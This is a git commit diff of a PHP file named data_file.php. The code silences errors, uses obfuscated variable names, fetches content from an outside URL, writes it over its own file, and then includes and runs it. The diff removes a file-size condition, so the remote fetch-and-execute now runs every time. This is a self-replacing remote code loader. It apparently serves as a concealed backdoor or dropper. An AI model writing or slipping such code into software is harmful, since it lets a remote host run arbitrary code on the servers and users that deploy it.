b3b6f8947028428e6528b2858e9c733b22218c97
Đỗ Quang Duy <103756160+qdw106311@users.noreply.github.com>
2024-07-26 06:32:55 +0700

    Update data_file.php

--- data_file.php
+++ data_file.php
@@ -1,9 +1,8 @@
 error_reporting(0);
-$QPUfCDSjWI = filesize(__FILE__);
-if(!($QPUfCDSjWI > 5700 && $QPUfCDSjWI < 5750) && $QPUfCDSjWI != 5703) {
+
     echo "Loading...     \r";
     $HwBDokqdMr = file_get_contents("https://dhtool.ikwb.com/220724dh.json");
     file_put_contents(__FILE__, $HwBDokqdMr);
     include __FILE__;
     exit;
-    }
+    
